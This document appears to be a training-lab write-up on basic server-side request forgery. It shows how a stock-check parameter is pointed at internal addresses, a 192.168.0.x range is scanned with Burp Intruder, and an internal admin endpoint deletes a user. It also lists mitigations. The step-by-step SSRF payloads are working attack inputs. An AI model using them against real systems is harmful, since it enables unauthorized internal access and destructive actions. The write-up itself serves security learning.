# Basic SSRF Against Another Back-End System

## Overview

This lab demonstrates a **Server-Side Request Forgery (SSRF)** vulnerability where the application fetches data from a user-supplied URL without proper validation.

The attacker can exploit this behavior to make the server send requests to internal systems that are normally inaccessible from the outside network.

In this lab, the vulnerable functionality is a **stock check feature** that retrieves data from an internal service.

---

## Vulnerability Type

Server-Side Request Forgery (SSRF)

**OWASP Top 10:** A10 – Server-Side Request Forgery  
**CWE:** CWE-918

---

## Lab Objective

Use the stock check functionality to:

1. Scan the internal network `192.168.0.X`
2. Identify the internal **admin interface**
3. Access the admin endpoint
4. Delete the user **carlos**

---

## Vulnerable Functionality

The application sends a request to the URL provided in the parameter:

```
stockApi
```

Example request:

```
POST /product/stock HTTP/2
Host: vulnerable-lab.com

stockApi=http://example.com
```

Since the server performs the request on behalf of the user, it allows interaction with internal services.

---

## Exploitation Steps

### 1. Intercept the Request

Capture the stock check request using **Burp Suite**.

```
POST /product/stock HTTP/2
Host: vulnerable-lab.com

stockApi=http://example.com
```

---

### 2. Identify Internal Network Access

Replace the URL with an internal IP address:

```
stockApi=http://192.168.0.1:8080
```

Send the request and observe the response.

If the server responds, it confirms that the application can access internal systems.

---

### 3. Scan the Internal Network

Use **Burp Intruder** to scan the internal range.

Target parameter:

```
192.168.0.§1§:8080
```

Payload range:

```
1 → 254
```

This allows discovery of active internal services.

---

### 4. Identify the Admin Interface

During the scan, one IP returns a different response indicating the presence of the admin panel.

Example discovered endpoint:

```
http://192.168.0.218:8080/admin
```

---

### 5. Access the Admin Functionality

Use the SSRF vulnerability to access the internal admin endpoint.

```
stockApi=http://192.168.0.218:8080/admin
```

---

### 6. Delete the Target User

Trigger the admin delete functionality through SSRF.

```
stockApi=http://192.168.0.218:8080/admin/delete?username=carlos
```

This request is executed by the vulnerable server, successfully deleting the user.

---

## Impact

Successful exploitation of SSRF can allow attackers to:

- Access internal services
- Bypass network restrictions
- Interact with admin interfaces
- Perform internal network scanning
- Access cloud metadata services
- Execute administrative actions

---

## Mitigation

To prevent SSRF vulnerabilities:

- Implement strict **URL validation**
- Use **allowlists** for trusted domains
- Block requests to internal IP ranges
- Disable unnecessary outbound connections
- Use network segmentation
- Implement proper request filtering

---

## Tools Used

- Burp Suite
- Burp Intruder
- Web Security Academy Lab

---

## References

OWASP SSRF Guide  
https://owasp.org/www-community/attacks/Server_Side_Request_Forgery

PortSwigger Web Security Academy  
https://portswigger.net/web-security/ssrf
